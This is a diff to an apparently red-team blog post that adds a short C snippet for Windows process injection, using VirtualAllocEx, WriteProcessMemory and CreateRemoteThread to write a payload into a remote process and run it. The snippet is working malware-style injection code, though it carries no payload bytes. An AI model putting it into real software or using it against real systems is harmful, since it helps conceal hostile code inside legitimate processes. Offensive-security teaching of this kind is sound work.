@@ -15,3 +15,20 @@ There are mulitiple ways of getting initial access during a Red Team campaign, b
 # Implementing Process Injection
 
 Process injection involves much of the same steps as we have already discussed in [this](https://coppertop-6.github.io/posts/Windows_Dropper/) post. We will make use of 3 Windows APIs that were designed for debugging processes, namely [VIrtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) and [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread). You might recognise these APIs and that is because it is the same APIs we used during the dropper design phase, but only for use in remote processes.
+
+```c#
+LPVOID pRemoteCode = NULL;
+        HANDLE hThread = NULL;
+
+  
+        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
+        
+        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
+        if (hThread != NULL) {
+                WaitForSingleObject(hThread, 500);
+                CloseHandle(hThread);
+                return 0;
+        }
+        return -1;
+```
